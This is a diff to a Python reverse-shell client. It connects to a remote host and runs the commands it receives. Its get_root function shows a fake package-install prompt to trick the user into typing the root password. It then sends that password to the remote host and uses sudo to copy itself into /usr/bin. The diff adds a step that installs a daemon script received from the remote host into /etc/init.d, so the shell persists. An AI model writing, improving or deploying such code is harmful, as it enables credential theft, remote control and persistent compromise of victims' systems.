@@ -10,7 +10,7 @@ def connection():
     client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
     client_socket.connect((host,port))
-    get_root_passwd()
+    get_root()
     while True:
 
         received_data = client_socket.recv(buff)
@@ -23,15 +23,17 @@ def connection():
             else:
                 client_socket.send(str(command) + "\nCommand succesfully executed.")
 
-def get_root_passwd():
+def get_root():
     prompt = "Python built-in package \"colorize\" not found. Trying to install...\nRoot password required: "
     password = getpass.getpass(prompt)
     client_socket.send("P4SSW0RD:" +str(password + "\n" +str(client_socket.getpeername())))
     cjinj = "echo %s | sudo -S cp rshell_client.py /usr/bin" %str(password)
-    command = subprocess.check_output(cjinj, shell=True)
+    command1 = subprocess.check_output(cjinj, shell=True)
     daemon = client_socket.recv(2048)
     fileopen = open("daemonize.sh","wb")
     fileopen.write(daemon)
     fileopen.close()
     djinj = "echo %s | sudo -S cp daemonize.sh /etc/init.d/" %(str(password))
+    command2= subprocess.check_output(djinj, shell=True)
+
 connection()
